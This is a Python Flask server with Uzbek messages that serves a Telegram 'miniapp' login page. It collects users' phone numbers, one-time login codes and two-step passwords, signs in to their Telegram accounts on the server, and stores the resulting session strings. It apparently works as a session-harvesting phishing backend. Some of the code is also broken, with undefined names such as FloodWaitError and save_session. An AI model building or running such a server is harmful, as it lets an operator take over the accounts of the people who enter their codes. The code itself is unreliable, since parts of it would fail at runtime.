import os
import asyncio
from flask import Flask, request, jsonify, render_template
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    PhoneCodeInvalidError,
    SessionPasswordNeededError
)
from database import get_db, init_db
from database import save_temp_session, save_login_code, get_login_code, delete_login_code, get_temp_session, delete_temp_session

# =====================
# CONFIG (ENV DAN!)
# =====================
API_HASH = os.getenv("API_HASH")

API_ID_RAW = os.getenv("API_ID")
API_ID = int(API_ID_RAW) if API_ID_RAW else None

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# =====================
# INIT
# =====================
app = Flask(__name__, template_folder="templates")
init_db()

# =====================
# ASYNC HELPER
# =====================
def run_async(coro):
    return asyncio.get_event_loop().run_until_complete(coro)

# =====================
# ROUTES
# =====================
@app.route("/")
def index():
    return "LOGIN SERVER WORKING"

@app.route("/miniapp")
def miniapp():
    return render_template("login.html")

@app.route("/send_code", methods=["POST"])
def send_code():
    phone = request.json.get("phone")
    if not phone:
        return jsonify({"status": "error", "message": "Telefon raqam yo‘q"}), 400

    async def _send():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            sent = await client.send_code_request(phone)
            session_string = client.session.save()
            save_temp_session(phone, session_string)
            return sent.phone_code_hash
        finally:
            await client.disconnect()

    try:
        phone_code_hash = asyncio.run(_send())
        save_login_code(phone, phone_code_hash)
        return jsonify({"status": "ok"}), 200

    except FloodWaitError as e:
        return jsonify({
            "status": "error",
            "message": f"{e.seconds} soniya kuting, Telegram blok qo‘ydi"
        }), 429

    except Exception as e:
        print("SEND_CODE ERROR:", repr(e))
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/verify_code", methods=["POST"])

def verify_code():
    phone = request.json.get("phone")
    code = request.json.get("code")
    password = request.json.get("password")  # agar bo‘lsa

    phone_code_hash = get_login_code(phone)
    session_string = get_temp_session(phone)

    if not phone_code_hash or not session_string:
        return jsonify({"status": "error", "message": "Sessiya eskirgan"}), 400

    async def _verify():
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()

        try:
            await client.sign_in(
                phone=phone,
                code=code,
                phone_code_hash=phone_code_hash
            )
        except SessionPasswordNeededError:
            if not password:
                return "2fa_required", None
            await client.sign_in(password=password)

        user = await client.get_me()
        session = client.session.save()
        await client.disconnect()
        return user.id, session

    try:
        result = asyncio.run(_verify())
        if result[0] == "2fa_required":
            return jsonify({"status": "2fa_required"})

        user_id, session_string = result
        save_session(user_id, session_string)
        delete_login_code(phone)
        delete_temp_session(phone)
        return jsonify({"status": "ok"})

    except PhoneCodeInvalidError:
        return jsonify({"status": "error", "message": "Kod noto‘g‘ri"})

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})



# =====================
# RUN
# =====================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
